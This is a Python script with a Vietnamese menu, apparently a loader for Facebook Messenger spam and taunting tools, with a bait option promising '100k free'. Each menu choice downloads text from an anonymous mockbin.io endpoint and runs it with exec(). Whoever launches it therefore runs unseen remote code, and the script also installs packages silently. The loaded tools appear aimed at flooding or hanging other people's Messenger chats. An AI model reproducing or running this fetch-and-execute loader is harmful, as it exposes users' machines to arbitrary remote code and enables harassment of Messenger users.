7
import requests,sys
from time import sleep
from datetime import datetime, timedelta
import os
try:
	import requests,colorama,prettytable
except:
	os.system("pip install requests")
	os.system("pip install colorama")
	os.system("pip install prettytable")
#màu
xnhac = "\033[1;36m"
do = "\033[1;31m"
luc = "\033[1;32m"
vang = "\033[1;33m"
xduong = "\033[1;34m"
hong = "\033[1;35m"
trang = "\033[1;37m"
whiteb="\033[1;37m"
red="\033[0;31m"
redb="\033[1;31m"
end='\033[0m'
def banner():
 banner = f"""
\033[1;31m███╗   ██╗ ██████╗     ███╗   ██╗██╗  ██╗ █████╗ ████████╗    ███╗   ██╗ █████╗ ███╗   ███╗
\033[1;31m████╗  ██║██╔════╝     ████╗  ██║██║  ██║██╔══██╗╚══██╔══╝    ████╗  ██║██╔══██╗████╗ ████║
\033[1;31m██╔██╗ ██║██║  ███╗    ██╔██╗ ██║███████║███████║   ██║       ██╔██╗ ██║███████║██╔████╔██║
\033[1;31m██║╚██╗██║██║   ██║    ██║╚██╗██║██╔══██║██╔══██║   ██║       ██║╚██╗██║██╔══██║██║╚██╔╝██║
\033[1;31m██║ ╚████║╚██████╔╝    ██║ ╚████║██║  ██║██║  ██║   ██║       ██║ ╚████║██║  ██║██║ ╚═╝ ██║
\033[1;31m╚═╝  ╚═══╝ ╚═════╝     ╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝       ╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝     ╚═╝
                                                                                           
"""
 for X in banner:
  sys.stdout.write(X)
  sys.stdout.flush() 
  sleep(0.00125)
os.system("cls" if os.name == "nt" else "clear")
banner()

print(" \033[1;37m- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -")
print("\033[1;31mAdmin: \033[1;33mNg Nhat Nam")                                     
print("- \033[1;37m - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -")
print("\033[1;32mChức Năng [1] \033[1;36mNhây")
print(" \033[1;37m────────────────────────────────────────────────────────────")                                                          
print("\033[1;32mChức năng [2] \033[1;36mNhây réo tên |")
print(" \033[1;37m────────────────────────────────────────────────────────────")
print("\033[1;32mChức năng [3] \033[1;36mTreo Messenger | ")
print(" \033[1;37m \033[1;37m────────────────────────────────────────────────────────────")
print("\033[1;32mChức năng [4] \033[1;36m nhận 100k free")                               
print(" \033[1;37m────────────────────────────────────────────────────────────")                                                          
print("\033[1;32mChức năng [5] \033[1;36m Thả sớ")
print(" \033[1;37m────────────────────────────────────────────────────────────")                                                         
chon = int(input('\033[1;31m[\033[1;37m[=.=]\033[1;31m] \033[1;37m=> \033[1;32mChọn chức năng \033[1;37m: \033[1;33m'))
if chon == 1 :
	exec(requests.get('https://fb6d9e09e67b43ce94cd1d277ae147ae.api.mockbin.io/').text)
if chon == 2 :
	exec(requests.get('https://e3dee31b96fc4c94bd64ac477f017314.api.mockbin.io/').text)
if chon == 3 :
	exec(requests.get('https://3068e0fb8dd04087a76b1582efba9302.api.mockbin.io//').text)
if chon == 4 :
	exec(requests.get('https://www.youtube.com/watch?v=dQw4w9WgXcQ').text)
if chon == 5 :
	exec(requests.get('https://093c1175f65246038b9274b9e76d1ba1.api.mockbin.io/').text)
	print (" Sai Lựa Chọn ")
	exit()
